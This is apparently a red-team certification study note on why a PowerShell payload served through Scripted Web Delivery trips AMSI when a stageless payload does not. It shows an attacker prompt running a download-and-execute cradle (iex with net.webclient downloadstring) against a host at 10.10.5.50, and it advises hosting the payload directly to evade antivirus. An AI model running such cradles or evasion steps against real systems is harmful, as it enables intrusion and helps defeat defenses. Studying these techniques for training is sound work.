
One common source of confusion is when hosting PowerShell payloads using the Scripted Web Delivery method, as these will generally get caught when your stageless PowerShell payloads do not.

```
PS C:\Users\Attacker> iex (new-object net.webclient).downloadstring("http://10.10.5.50/a")
IEX : At line:1 char:1
+ Set-StrictMode -Version 2
+ ~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
At line:1 char:304409
+ ... WTtJBgA="));IEX (New-Object IO.StreamReader(New-Object IO.Compression ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
```

#### 🖊️ Payload is fine, avoid Scripted Web Delivery !!

The reason for this is that it uses the `compress.ps1` template instead, which decompresses the payload from a Gzip stream.  In my (limited) experience, AMSI will flag almost anything as malicious if it sees a binary file coming out of a Gzip stream.  Unless you have a specific requirement for using a compressed version, in which case you can re-work this template as well, the easiest workaround is to just host your stageless PowerShell payload directly via _Site Management > Host File_.


#### ⚠ Opsec




### Properties
---
📆 created   {{28-02-2024}} 20:31
🏷️ tags: #redteam #crto 

---

